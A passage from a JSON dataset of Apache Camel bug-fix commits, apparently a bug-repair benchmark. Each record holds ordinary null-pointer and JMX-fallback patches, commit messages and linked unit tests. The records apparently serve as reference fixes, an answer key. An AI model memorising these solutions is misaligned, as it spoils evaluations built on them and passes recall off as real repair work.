    "camel_e5b2d76": {
        "bug_id": "camel_e5b2d76",
        "commit": "https://github.com/apache/camel/commit/e5b2d7658236f910c36eddce72bc555326b31cdb",
        "file": [
            {
                "additions": 7,
                "blob_url": "https://github.com/apache/camel/blob/e5b2d7658236f910c36eddce72bc555326b31cdb/components/camel-saxon/src/main/java/org/apache/camel/component/xquery/XQueryBuilder.java",
                "changes": 12,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-saxon/src/main/java/org/apache/camel/component/xquery/XQueryBuilder.java?ref=e5b2d7658236f910c36eddce72bc555326b31cdb",
                "deletions": 5,
                "filename": "components/camel-saxon/src/main/java/org/apache/camel/component/xquery/XQueryBuilder.java",
                "patch": "@@ -639,10 +639,13 @@ protected void addParameters(DynamicQueryContext dynamicQueryContext, Map<String\n     protected void addParameters(DynamicQueryContext dynamicQueryContext, Map<String, Object> map, String parameterPrefix) {\n         Set<Map.Entry<String, Object>> propertyEntries = map.entrySet();\n         for (Map.Entry<String, Object> entry : propertyEntries) {\n-            dynamicQueryContext.setParameter(\n-                StructuredQName.fromClarkName(parameterPrefix + entry.getKey()),\n-                new ObjectValue(entry.getValue())\n-            );\n+            // skip headers with null values\n+            if (entry.getValue() != null) {\n+                dynamicQueryContext.setParameter(\n+                        StructuredQName.fromClarkName(parameterPrefix + entry.getKey()),\n+                        new ObjectValue(entry.getValue())\n+                );\n+            }\n         }\n     }\n \n@@ -659,7 +662,6 @@ protected synchronized void initialize(Exchange exchange) throws XPathException,\n             LOG.debug(\"Initializing XQueryBuilder {}\", this);\n             if (configuration == null) {\n                 configuration = new Configuration();\n-                //configuration.setHostLanguage(Configuration.XQUERY);\n                 configuration.setStripsWhiteSpace(isStripsAllWhiteSpace() ? Whitespace.ALL : Whitespace.IGNORABLE);\n                 LOG.debug(\"Created new Configuration {}\", configuration);\n             } else {",
                "raw_url": "https://github.com/apache/camel/raw/e5b2d7658236f910c36eddce72bc555326b31cdb/components/camel-saxon/src/main/java/org/apache/camel/component/xquery/XQueryBuilder.java",
                "sha": "a4c61d967800ee4b2667cd948c5edfafc12798d2",
                "status": "modified"
            },
            {
                "additions": 56,
                "blob_url": "https://github.com/apache/camel/blob/e5b2d7658236f910c36eddce72bc555326b31cdb/components/camel-saxon/src/test/java/org/apache/camel/component/xquery/XQueryNullHeaderTest.java",
                "changes": 56,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-saxon/src/test/java/org/apache/camel/component/xquery/XQueryNullHeaderTest.java?ref=e5b2d7658236f910c36eddce72bc555326b31cdb",
                "deletions": 0,
                "filename": "components/camel-saxon/src/test/java/org/apache/camel/component/xquery/XQueryNullHeaderTest.java",
                "patch": "@@ -0,0 +1,56 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.component.xquery;\n+\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.test.spring.CamelSpringTestSupport;\n+import org.junit.Test;\n+import org.springframework.context.support.ClassPathXmlApplicationContext;\n+\n+/**\n+ * @version \n+ */\n+public class XQueryNullHeaderTest extends CamelSpringTestSupport {\n+\n+    @Test\n+    public void testHeader() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"<employee id=\\\"James\\\"><name><firstName>James</firstName>\"\n+                                    + \"<lastName>Strachan</lastName></name><location><city>London</city></location></employee>\");\n+\n+        template.sendBodyAndHeader(\"direct:start\", \"<person user='James'><firstName>James</firstName>\"\n+                          + \"<lastName>Strachan</lastName><city>London</city></person>\", \"foo\", \"123\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Test\n+    public void testHeaderWithNull() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedBodiesReceived(\"<employee id=\\\"James\\\"><name><firstName>James</firstName>\"\n+                                    + \"<lastName>Strachan</lastName></name><location><city>London</city></location></employee>\");\n+\n+        template.sendBodyAndHeader(\"direct:start\", \"<person user='James'><firstName>James</firstName>\"\n+                          + \"<lastName>Strachan</lastName><city>London</city></person>\", \"foo\", null);\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    protected ClassPathXmlApplicationContext createApplicationContext() {\n+        return new ClassPathXmlApplicationContext(\"org/apache/camel/component/xquery/xqueryExampleTest.xml\");\n+    }\n+}\n\\ No newline at end of file",
                "raw_url": "https://github.com/apache/camel/raw/e5b2d7658236f910c36eddce72bc555326b31cdb/components/camel-saxon/src/test/java/org/apache/camel/component/xquery/XQueryNullHeaderTest.java",
                "sha": "969fd621dae458915efffa8c5a741beb65b3da9b",
                "status": "added"
            }
        ],
        "message": "CAMEL-10653: Fix NPE issue with null header values for camel-saxon after upgrade to 9.7 api. Thanks to Nikolay Voskresenskiy for reporting and unit test.",
        "parent": "https://github.com/apache/camel/commit/2815282561ed1ad5d0de4ddb70eb8ed288a2a667",
        "patched_files": [
            "XQueryBuilder.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "XQueryNullHeaderTest.java"
        ]
    },
    "camel_e6bf8d8": {
        "bug_id": "camel_e6bf8d8",
        "commit": "https://github.com/apache/camel/commit/e6bf8d8e1b9948069ad38f0444bf0924b63599ef",
        "file": [
            {
                "additions": 5,
                "blob_url": "https://github.com/apache/camel/blob/e6bf8d8e1b9948069ad38f0444bf0924b63599ef/camel-core/src/main/java/org/apache/camel/util/MessageHelper.java",
                "changes": 8,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/util/MessageHelper.java?ref=e6bf8d8e1b9948069ad38f0444bf0924b63599ef",
                "deletions": 3,
                "filename": "camel-core/src/main/java/org/apache/camel/util/MessageHelper.java",
                "patch": "@@ -126,9 +126,11 @@ public static String extractBodyForLogging(Message message) {\n         // default to 1000 chars\n         int length = 1000;\n \n-        String property = message.getExchange().getContext().getProperties().get(Exchange.LOG_DEBUG_BODY_MAX_CHARS);\n-        if (property != null) {\n-            length = message.getExchange().getContext().getTypeConverter().convertTo(Integer.class, property);\n+        if (message.getExchange() != null) {\n+            String property = message.getExchange().getContext().getProperties().get(Exchange.LOG_DEBUG_BODY_MAX_CHARS);\n+            if (property != null) {\n+                length = message.getExchange().getContext().getTypeConverter().convertTo(Integer.class, property);\n+            }\n         }\n \n         Object obj = message.getBody();",
                "raw_url": "https://github.com/apache/camel/raw/e6bf8d8e1b9948069ad38f0444bf0924b63599ef/camel-core/src/main/java/org/apache/camel/util/MessageHelper.java",
                "sha": "aa78cb3e2a223ea8e4f349121fcf604c6a7cf29a",
                "status": "modified"
            },
            {
                "additions": 81,
                "blob_url": "https://github.com/apache/camel/blob/e6bf8d8e1b9948069ad38f0444bf0924b63599ef/camel-core/src/test/java/org/apache/camel/issues/SplitterUsingBeanReturningMessageTest.java",
                "changes": 81,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/test/java/org/apache/camel/issues/SplitterUsingBeanReturningMessageTest.java?ref=e6bf8d8e1b9948069ad38f0444bf0924b63599ef",
                "deletions": 0,
                "filename": "camel-core/src/test/java/org/apache/camel/issues/SplitterUsingBeanReturningMessageTest.java",
                "patch": "@@ -0,0 +1,81 @@\n+/**\n+ * Licensed to the Apache Software Foundation (ASF) under one or more\n+ * contributor license agreements.  See the NOTICE file distributed with\n+ * this work for additional information regarding copyright ownership.\n+ * The ASF licenses this file to You under the Apache License, Version 2.0\n+ * (the \"License\"); you may not use this file except in compliance with\n+ * the License.  You may obtain a copy of the License at\n+ *\n+ *      http://www.apache.org/licenses/LICENSE-2.0\n+ *\n+ * Unless required by applicable law or agreed to in writing, software\n+ * distributed under the License is distributed on an \"AS IS\" BASIS,\n+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+ * See the License for the specific language governing permissions and\n+ * limitations under the License.\n+ */\n+package org.apache.camel.issues;\n+\n+import java.util.LinkedList;\n+import java.util.List;\n+\n+import org.apache.camel.ContextTestSupport;\n+import org.apache.camel.Exchange;\n+import org.apache.camel.Message;\n+import org.apache.camel.builder.RouteBuilder;\n+import org.apache.camel.component.mock.MockEndpoint;\n+import org.apache.camel.impl.JndiRegistry;\n+\n+/**\n+ * @version $Revision$\n+ */\n+public class SplitterUsingBeanReturningMessageTest extends ContextTestSupport {\n+\n+    @Override\n+    protected JndiRegistry createRegistry() throws Exception {\n+        JndiRegistry jndi = super.createRegistry();\n+        jndi.bind(\"mySplitter\", new MyOtherSplitterBean());\n+        return jndi;\n+    }\n+\n+    public static class MyOtherSplitterBean {\n+        public List split(Exchange exchange) {\n+\n+            Message in = exchange.getIn();\n+            assertNotNull(in.toString());\n+\n+            List<Message> msgs = new LinkedList<Message>();\n+\n+            Message copy = in.copy();\n+            assertNotNull(copy.toString());\n+\n+            copy.setBody(\"not empty\");\n+            copy.setHeader(\"type\", \"TYPE1\");\n+            msgs.add(copy);\n+\n+            return msgs;\n+        }\n+    }\n+\n+    public void testSplitWithMessage() throws Exception {\n+        MockEndpoint mock = getMockEndpoint(\"mock:result\");\n+        mock.expectedMessageCount(1);\n+        mock.message(0).body().isEqualTo(\"not empty\");\n+        mock.message(0).header(\"type\").isEqualTo(\"TYPE1\");\n+\n+        template.sendBody(\"direct:start\", \"Hello World\");\n+\n+        assertMockEndpointsSatisfied();\n+    }\n+\n+    @Override\n+    protected RouteBuilder createRouteBuilder() throws Exception {\n+        return new RouteBuilder() {\n+            @Override\n+            public void configure() throws Exception {\n+                from(\"direct:start\")\n+                    .split().method(\"mySplitter\").to(\"log:foo\", \"mock:result\");\n+            }\n+        };\n+    }\n+}",
                "raw_url": "https://github.com/apache/camel/raw/e6bf8d8e1b9948069ad38f0444bf0924b63599ef/camel-core/src/test/java/org/apache/camel/issues/SplitterUsingBeanReturningMessageTest.java",
                "sha": "3f58ef35e9e8e31f7d971d65af6303cce349cca3",
                "status": "added"
            }
        ],
        "message": "CAMEL-1865: Fixed NPE when logging message when its a copy and it have not assigned an Exchange.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@799332 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/d358eb8e0ad68784b9f11a5c26abe099f835fa43",
        "patched_files": [
            "MessageHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "MessageHelperTest.java",
            "SplitterUsingBeanReturningMessageTest.java"
        ]
    },
    "camel_e7e6728": {
        "bug_id": "camel_e7e6728",
        "commit": "https://github.com/apache/camel/commit/e7e6728bf4902f21600981adff0c7ab842f3ec27",
        "file": [
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "changes": 29,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 17,
                "filename": "camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "patch": "@@ -750,7 +750,18 @@ protected void doStart() throws Exception {\n             }\n         }\n \n-        lifecycleStrategy.onContextStart(this);\n+        try {\n+            lifecycleStrategy.onContextStart(this);\n+        } catch (Exception e) {\n+            // not all containers allow access to its MBeanServer (such as OC4j)\n+            LOG.warn(\"Cannot start lifecycleStrategy: \" + lifecycleStrategy + \". Cause: \" + e.getMessage());\n+            if (lifecycleStrategy instanceof InstrumentationLifecycleStrategy) {\n+                // fallback to non JMX lifecycle to allow Camel to startup\n+                LOG.warn(\"Will fallback to use default (non JMX) lifecycle strategy\");\n+                lifecycleStrategy = new DefaultLifecycleStrategy();\n+                lifecycleStrategy.onContextStart(this);\n+            }\n+        }\n \n         forceLazyInitialization();\n         if (components != null) {\n@@ -768,7 +779,6 @@ protected void doStart() throws Exception {\n                 routeService.start();\n             }\n         }\n-        //startRoutes(routes);\n \n         LOG.info(\"Apache Camel \" + getVersion() + \" (CamelContext:\" + getName() + \") started\");\n     }\n@@ -781,21 +791,6 @@ protected void startRouteDefinitions(Collection<RouteDefinition> list) throws Ex\n         }\n     }\n \n-    /*\n-        protected void startRoutes(Collection<Route> routeList) throws Exception {\n-            if (routeList != null) {\n-                for (Route route : routeList) {\n-                    List<Service> services = route.getServicesForRoute();\n-                    for (Service service : services) {\n-                        addService(service);\n-                    }\n-                }\n-            }\n-        }\n-\n-    */\n-\n-\n     /**\n      * Starts the given route service\n      */",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/impl/DefaultCamelContext.java",
                "sha": "d075a323a70aaff1a7693c07452de0c7b38bb2c7",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/management/DefaultInstrumentationAgent.java",
                "changes": 34,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/DefaultInstrumentationAgent.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 22,
                "filename": "camel-core/src/main/java/org/apache/camel/management/DefaultInstrumentationAgent.java",
                "patch": "@@ -73,29 +73,23 @@\n \n     protected void finalizeSettings() {\n         if (registryPort == null) {\n-            registryPort = Integer.getInteger(JmxSystemPropertyKeys.REGISTRY_PORT,\n-                    DEFAULT_REGISTRY_PORT);\n+            registryPort = Integer.getInteger(JmxSystemPropertyKeys.REGISTRY_PORT, DEFAULT_REGISTRY_PORT);\n         }\n \n         if (connectorPort == null) {\n-            connectorPort = Integer.getInteger(JmxSystemPropertyKeys.CONNECTOR_PORT,\n-                    DEFAULT_CONNECTION_PORT);\n+            connectorPort = Integer.getInteger(JmxSystemPropertyKeys.CONNECTOR_PORT, DEFAULT_CONNECTION_PORT);\n         }\n \n         if (mBeanServerDefaultDomain == null) {\n-            mBeanServerDefaultDomain =\n-                System.getProperty(JmxSystemPropertyKeys.DOMAIN, DEFAULT_DOMAIN);\n+            mBeanServerDefaultDomain = System.getProperty(JmxSystemPropertyKeys.DOMAIN, DEFAULT_DOMAIN);\n         }\n \n         if (mBeanObjectDomainName == null) {\n-            mBeanObjectDomainName =\n-                System.getProperty(JmxSystemPropertyKeys.MBEAN_DOMAIN, DEFAULT_DOMAIN);\n+            mBeanObjectDomainName = System.getProperty(JmxSystemPropertyKeys.MBEAN_DOMAIN, DEFAULT_DOMAIN);\n         }\n \n         if (serviceUrlPath == null) {\n-            serviceUrlPath =\n-                System.getProperty(JmxSystemPropertyKeys.SERVICE_URL_PATH,\n-                        DEFAULT_SERVICE_URL_PATH);\n+            serviceUrlPath = System.getProperty(JmxSystemPropertyKeys.SERVICE_URL_PATH, DEFAULT_SERVICE_URL_PATH);\n         }\n \n         if (createConnector == null) {\n@@ -149,12 +143,10 @@ public void register(Object obj, ObjectName name, boolean forceRegistration) thr\n         try {\n             registerMBeanWithServer(obj, name, forceRegistration);\n         } catch (NotCompliantMBeanException e) {\n-            // If this is not a \"normal\" MBean, then try to deploy it using JMX\n-            // annotations\n-            ModelMBeanInfo mbi = null;\n+            // If this is not a \"normal\" MBean, then try to deploy it using JMX annotations\n+            ModelMBeanInfo mbi;\n             mbi = assembler.getMBeanInfo(obj, name.toString());\n-            RequiredModelMBean mbean = (RequiredModelMBean)server.instantiate(RequiredModelMBean.class\n-                .getName());\n+            RequiredModelMBean mbean = (RequiredModelMBean)server.instantiate(RequiredModelMBean.class.getName());\n             mbean.setModelMBeanInfo(mbi);\n             try {\n                 mbean.setManagedResource(obj, \"ObjectReference\");\n@@ -200,7 +192,7 @@ protected void doStop() throws Exception {\n         Object[] mBeans = mbeans.toArray();\n         int caught = 0;\n         for (Object name : mBeans) {\n-            mbeans.remove((ObjectName)name);\n+            mbeans.remove(name);\n             try {\n                 unregister((ObjectName)name);\n             } catch (JMException jmex) {\n@@ -252,7 +244,7 @@ private void registerMBeanWithServer(Object obj, ObjectName name, boolean forceR\n     }\n \n     protected void createMBeanServer() {\n-        String hostName = DEFAULT_HOST;\n+        String hostName;\n         boolean canAccessSystemProps = true;\n         try {\n             // we'll do it this way mostly to determine if we should lookup the\n@@ -269,8 +261,7 @@ protected void createMBeanServer() {\n             try {\n                 hostName = InetAddress.getLocalHost().getHostName();\n             } catch (UnknownHostException uhe) {\n-                LOG.info(\"Cannot determine localhost name. Using default: \"\n-                         + DEFAULT_REGISTRY_PORT, uhe);\n+                LOG.info(\"Cannot determine localhost name. Using default: \" + DEFAULT_REGISTRY_PORT, uhe);\n                 hostName = DEFAULT_HOST;\n             }\n         } else {\n@@ -298,8 +289,7 @@ protected MBeanServer findOrCreateMBeanServer() {\n         }\n \n         // look for the first mbean server that has match default domain name\n-        List<MBeanServer> servers =\n-            (List<MBeanServer>)MBeanServerFactory.findMBeanServer(null);\n+        List<MBeanServer> servers = (List<MBeanServer>)MBeanServerFactory.findMBeanServer(null);\n \n         for (MBeanServer server : servers) {\n             if (LOG.isDebugEnabled()) {",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/management/DefaultInstrumentationAgent.java",
                "sha": "7d27d2e21022dd580203ed197b0c8a90a772b18a",
                "status": "modified"
            },
            {
                "additions": 4,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "changes": 5,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 1,
                "filename": "camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "patch": "@@ -39,6 +39,7 @@\n import org.apache.camel.spi.InstrumentationAgent;\n import org.apache.camel.spi.LifecycleStrategy;\n import org.apache.camel.spi.RouteContext;\n+import org.apache.camel.util.ObjectHelper;\n import org.apache.commons.logging.Log;\n import org.apache.commons.logging.LogFactory;\n \n@@ -88,7 +89,9 @@ public void onContextStart(CamelContext context) {\n                 ManagedService ms = new ManagedService(dc);\n                 agent.register(ms, getNamingStrategy().getObjectName(dc));\n             } catch (Exception e) {\n-                LOG.warn(\"Could not register CamelContext MBean\", e);\n+                // must rethrow to allow CamelContext fallback to non JMX agent to allow\n+                // Camel to continue to run\n+                throw ObjectHelper.wrapRuntimeCamelException(e);\n             }\n         }\n     }",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/camel-core/src/main/java/org/apache/camel/management/InstrumentationLifecycleStrategy.java",
                "sha": "e514bf957acac4a77796a4f7679eeecea25f8672",
                "status": "modified"
            },
            {
                "additions": 2,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfConverter.java",
                "changes": 6,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfConverter.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 4,
                "filename": "components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfConverter.java",
                "patch": "@@ -111,10 +111,8 @@ public static DataFormat toDataFormat(final String name) {\n         \n         if (MessageContentsList.class.isAssignableFrom(value.getClass())) {\n             MessageContentsList list = (MessageContentsList)value;\n-            \n-            for (int i = 0; i < list.size(); i++) {\n-                Object embedded = list.get(i);\n-                \n+\n+            for (Object embedded : list) {\n                 if (embedded != null) {\n                     if (type.isInstance(embedded)) {\n                         return type.cast(embedded);",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-cxf/src/main/java/org/apache/camel/component/cxf/converter/CxfConverter.java",
                "sha": "093c1904fa94356bf9467ca3e912396610566967",
                "status": "modified"
            },
            {
                "additions": 12,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-spring/src/main/java/org/apache/camel/spring/CamelContextFactoryBean.java",
                "changes": 24,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring/src/main/java/org/apache/camel/spring/CamelContextFactoryBean.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 12,
                "filename": "components/camel-spring/src/main/java/org/apache/camel/spring/CamelContextFactoryBean.java",
                "patch": "@@ -261,16 +261,21 @@ public void afterPropertiesSet() throws Exception {\n         // lets force any lazy creation\n         getContext().addRouteDefinitions(routes);\n \n+        // setup JMX agent\n+        initJMXAgent();\n+\n+        if (LOG.isDebugEnabled()) {\n+            LOG.debug(\"Found JAXB created routes: \" + getRoutes());\n+        }\n+        findRouteBuilders();\n+        installRoutes();\n+    }\n+\n+    private void initJMXAgent() throws Exception {\n         if (camelJMXAgent != null && camelJMXAgent.isDisabled()) {\n             LOG.debug(\"JMXAgent disabled\");\n             getContext().setLifecycleStrategy(new DefaultLifecycleStrategy());\n         } else if (camelJMXAgent != null) {\n-            LOG.debug(\"JMXAgent enabled\");\n-\n-            if (lifecycleStrategy != null) {\n-                LOG.warn(\"lifecycleStrategy will be overriden by InstrumentationLifecycleStrategy\");\n-            }\n-\n             DefaultInstrumentationAgent agent = new DefaultInstrumentationAgent();\n             agent.setConnectorPort(camelJMXAgent.getConnectorPort());\n             agent.setCreateConnector(camelJMXAgent.isCreateConnector());\n@@ -280,14 +285,9 @@ public void afterPropertiesSet() throws Exception {\n             agent.setServiceUrlPath(camelJMXAgent.getServiceUrlPath());\n             agent.setUsePlatformMBeanServer(camelJMXAgent.isUsePlatformMBeanServer());\n \n+            LOG.info(\"JMXAgent enabled: \" + camelJMXAgent);\n             getContext().setLifecycleStrategy(new InstrumentationLifecycleStrategy(agent));\n         }\n-\n-        if (LOG.isDebugEnabled()) {\n-            LOG.debug(\"Found JAXB created routes: \" + getRoutes());\n-        }\n-        findRouteBuilders();\n-        installRoutes();\n     }\n \n     @SuppressWarnings(\"unchecked\")",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-spring/src/main/java/org/apache/camel/spring/CamelContextFactoryBean.java",
                "sha": "322c459ef3265a13653000be724d3e70d4be2f02",
                "status": "modified"
            },
            {
                "additions": 28,
                "blob_url": "https://github.com/apache/camel/blob/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-spring/src/main/java/org/apache/camel/spring/CamelJMXAgentDefinition.java",
                "changes": 28,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-spring/src/main/java/org/apache/camel/spring/CamelJMXAgentDefinition.java?ref=e7e6728bf4902f21600981adff0c7ab842f3ec27",
                "deletions": 0,
                "filename": "components/camel-spring/src/main/java/org/apache/camel/spring/CamelJMXAgentDefinition.java",
                "patch": "@@ -144,4 +144,32 @@ public Boolean isDisabled() {\n     public void setDisabled(Boolean value) {\n         disabled = value != null ? value : Boolean.FALSE;\n     }\n+\n+    @Override\n+    public String toString() {\n+        StringBuilder sb = new StringBuilder();\n+        sb.append(\"CamelJMXAgent[\");\n+        sb.append(\"usePlatformMBeanServer=\").append(usePlatformMBeanServer);\n+        if (createConnector != null) {\n+            sb.append(\", createConnector=\").append(createConnector);\n+        }\n+        if (connectorPort != null) {\n+            sb.append(\", connectorPort=\").append(connectorPort);\n+        }\n+        if (registryPort != null) {\n+            sb.append(\", registryPort=\").append(registryPort);\n+        }\n+        if (serviceUrlPath != null) {\n+            sb.append(\", serviceUrlPath=\").append(serviceUrlPath);\n+        }\n+        if (mbeanServerDefaultDomain != null) {\n+            sb.append(\", mbeanServerDefaultDomain=\").append(mbeanServerDefaultDomain);\n+        }\n+        if (mbeanObjectDomainName != null) {\n+            sb.append(\", mbeanObjectDomainName=\").append(mbeanObjectDomainName);\n+        }\n+        sb.append(\"]\");\n+        return sb.toString();\n+    }\n+\n }",
                "raw_url": "https://github.com/apache/camel/raw/e7e6728bf4902f21600981adff0c7ab842f3ec27/components/camel-spring/src/main/java/org/apache/camel/spring/CamelJMXAgentDefinition.java",
                "sha": "15f21f99a15816ab4a75e77f642c0a4e4ff07df3",
                "status": "modified"
            }
        ],
        "message": "CAMEL-1462: Camel will fallback to non JMX lifecycle if Camel cannot access it, eg. could be because of lack of priviledges on the platform such as OC4j. This causes later a NPE in DefaultCamelContext on endpoint lookup.\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@755136 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/83f402873e9790835a4ce504763b87b28be23904",
        "patched_files": [
            "CamelContextFactoryBean.java",
            "DefaultCamelContext.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "DefaultCamelContextTest.java",
            "CamelContextFactoryBeanTest.java"
        ]
    },
    "camel_e9a0ac3": {
        "bug_id": "camel_e9a0ac3",
        "commit": "https://github.com/apache/camel/commit/e9a0ac368fe59990a6b46cc476c5fefddb023aea",
        "file": [
            {
                "additions": 3,
                "blob_url": "https://github.com/apache/camel/blob/e9a0ac368fe59990a6b46cc476c5fefddb023aea/tooling/apt/src/main/java/org/apache/camel/tools/apt/helper/IOHelper.java",
                "changes": 4,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/tooling/apt/src/main/java/org/apache/camel/tools/apt/helper/IOHelper.java?ref=e9a0ac368fe59990a6b46cc476c5fefddb023aea",
                "deletions": 1,
                "filename": "tooling/apt/src/main/java/org/apache/camel/tools/apt/helper/IOHelper.java",
                "patch": "@@ -70,7 +70,9 @@ public static String loadText(InputStream in, boolean skipCommentOrEmptyLines) t\n     public static void close(Closeable... closeables) {\n         for (Closeable closeable : closeables) {\n             try {\n-                closeable.close();\n+                if (closeable != null) {\n+                    closeable.close();\n+                }\n             } catch (IOException e) {\n                 // ignore\n             }",
                "raw_url": "https://github.com/apache/camel/raw/e9a0ac368fe59990a6b46cc476c5fefddb023aea/tooling/apt/src/main/java/org/apache/camel/tools/apt/helper/IOHelper.java",
                "sha": "8167a4a3dd1507a1fa70967c73cd269eaed06d10",
                "status": "modified"
            }
        ],
        "message": "CAMEL-12745: NullPointerException in APT IOHelper",
        "parent": "https://github.com/apache/camel/commit/d32b269b11f4f4ca7226725b27de25eb61479d2f",
        "patched_files": [
            "IOHelper.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "IOHelperTest.java"
        ]
    },
    "camel_ebd156c": {
        "bug_id": "camel_ebd156c",
        "commit": "https://github.com/apache/camel/commit/ebd156cf4aeda282c3647c2e7852ef0519994c51",
        "file": [
            {
                "additions": 11,
                "blob_url": "https://github.com/apache/camel/blob/ebd156cf4aeda282c3647c2e7852ef0519994c51/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppMessage.java",
                "changes": 15,
                "contents_url": "https://api.github.com/repos/apache/camel/contents/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppMessage.java?ref=ebd156cf4aeda282c3647c2e7852ef0519994c51",
                "deletions": 4,
                "filename": "components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppMessage.java",
                "patch": "@@ -17,6 +17,7 @@\n package org.apache.camel.component.smpp;\n \n import java.io.UnsupportedEncodingException;\n+import java.nio.charset.Charset;\n \n import org.apache.camel.impl.DefaultMessage;\n import org.jsmpp.bean.AlertNotification;\n@@ -77,11 +78,17 @@ public boolean isDeliveryReceipt() {\n     protected Object createBody() {\n         if (command instanceof MessageRequest) {\n             byte[] shortMessage = ((MessageRequest) command).getShortMessage();\n-            try {\n-                return new String(shortMessage, configuration.getEncoding());\n-            } catch (UnsupportedEncodingException e) {\n-                return new String(shortMessage);\n+            if (shortMessage == null || shortMessage.length == 0) {\n+                return null;\n             }\n+            if (Charset.isSupported(configuration.getEncoding())) {\n+                try {\n+                    return new String(shortMessage, configuration.getEncoding());\n+                } catch (UnsupportedEncodingException e) {\n+                    // ignore\n+                }\n+            }\n+            return new String(shortMessage);\n         }\n \n         return null;",
                "raw_url": "https://github.com/apache/camel/raw/ebd156cf4aeda282c3647c2e7852ef0519994c51/components/camel-smpp/src/main/java/org/apache/camel/component/smpp/SmppMessage.java",
                "sha": "f8992295f4a6d2cfc46790f2c65bab4c7c4bf7ab",
                "status": "modified"
            }
        ],
        "message": "CAMEL-5691: Fixed potential NPE\n\ngit-svn-id: https://svn.apache.org/repos/asf/camel/trunk@1395580 13f79535-47bb-0310-9956-ffa450edef68",
        "parent": "https://github.com/apache/camel/commit/d5096566c0ac2fb9ebe26fd6e9b8737e2cd68dc5",
        "patched_files": [
            "SmppMessage.java"
        ],
        "repo": "camel",
        "unit_tests": [
            "SmppMessageTest.java"
        ]
    },
    "camel_efe77bb": {
        "bug_id": "camel_efe77bb",
        "commit": "https://github.com/apache/camel/commit/efe77bbdd09e097752c6e9246c1e7cf7b0be73e0",
        "file": [
            {
                "additions": 4,
